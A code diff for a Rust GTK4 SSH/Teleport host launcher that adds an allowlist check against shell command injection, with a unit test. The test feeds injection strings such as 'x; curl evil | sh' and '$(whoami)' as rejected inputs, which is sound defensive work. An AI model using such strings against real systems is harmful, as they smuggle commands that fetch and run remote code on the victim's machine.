@@ -82,6 +82,9 @@ fn refresh_list(list: &gtk4::ListBox) {
             items.push(Item::Message("No hosts in ~/.ssh/config".to_string()));
         }
         for host in ssh_hosts {
+            if !is_safe_host(&host) {
+                continue;
+            }
             items.push(Item::Host {
                 command: format!("ssh {host}"),
                 name: host,
@@ -95,6 +98,9 @@ fn refresh_list(list: &gtk4::ListBox) {
             }
             Ok(nodes) => {
                 for node in nodes {
+                    if !is_safe_host(&node) {
+                        continue;
+                    }
                     items.push(Item::Host {
                         command: format!("tsh ssh {node}"),
                         name: node,
@@ -140,6 +146,17 @@ fn teleport_nodes() -> Result<Vec<String>, String> {
     names.sort();
     names.dedup();
     Ok(names)
+}
+
+/// Hostnames we are willing to interpolate into a shell command. Conservative
+/// allowlist: letters, digits, and the punctuation that appears in real host
+/// aliases / Teleport node names. Anything else is dropped to avoid command
+/// injection when the row is activated (the command is fed to a shell).
+pub fn is_safe_host(name: &str) -> bool {
+    !name.is_empty()
+        && name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@'))
 }
 
 /// `Host` aliases from ssh config text, skipping wildcard and negated
@@ -233,5 +250,16 @@ mod tests {
     fn skips_non_host_lines_and_dedupes() {
         let config = "# Host commented\nHostName not-a-host\nHost a\nHost a\n";
         assert_eq!(parse_ssh_config(config), vec!["a"]);
+    }
+
+    #[test]
+    fn rejects_unsafe_host_names() {
+        assert!(is_safe_host("dev"));
+        assert!(is_safe_host("db.example.com"));
+        assert!(is_safe_host("user@host-1"));
+        assert!(!is_safe_host("x; curl evil | sh"));
+        assert!(!is_safe_host("a b"));
+        assert!(!is_safe_host("$(whoami)"));
+        assert!(!is_safe_host(""));
     }
 }
